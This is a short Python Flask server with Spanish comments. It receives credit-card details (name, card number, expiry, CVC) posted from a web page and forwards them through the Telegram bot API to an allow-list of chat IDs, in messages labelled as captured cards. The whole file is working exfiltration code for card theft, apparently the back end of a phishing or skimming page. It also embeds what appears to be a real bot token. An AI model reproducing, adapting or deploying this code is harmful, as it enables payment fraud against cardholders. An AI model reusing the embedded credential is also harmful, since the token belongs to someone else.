import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# La lista de los únicos que pueden recibir los datos en su Telegram
ALLOWED_RECEIVERS = ['6953415010', '7707049896']

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    
    # El ID de destino que viene de la página (el que tú configuraste en el HTML)
    target_id = str(data.get('target_id'))

    # --- LA ÚNICA VALIDACIÓN QUE IMPORTA ---
    # Si el ID que pide recibir la CC no está en tu lista, el bot simplemente no hace nada.
    if target_id not in ALLOWED_RECEIVERS:
        print(f"🚫 ID {target_id} no autorizado. El bot no enviará nada.")
        return jsonify({"status": "ignored"}), 200 # Respondemos 200 para que la página no de error

    # Si el ID es válido, procedemos a enviar la CC
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": target_id,
        "text": mensaje,
        "parse_mode": "Markdown"
    }

    try:
        requests.post(url_telegram, json=payload)
        print(f"✅ CC enviada con éxito al ID: {target_id}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)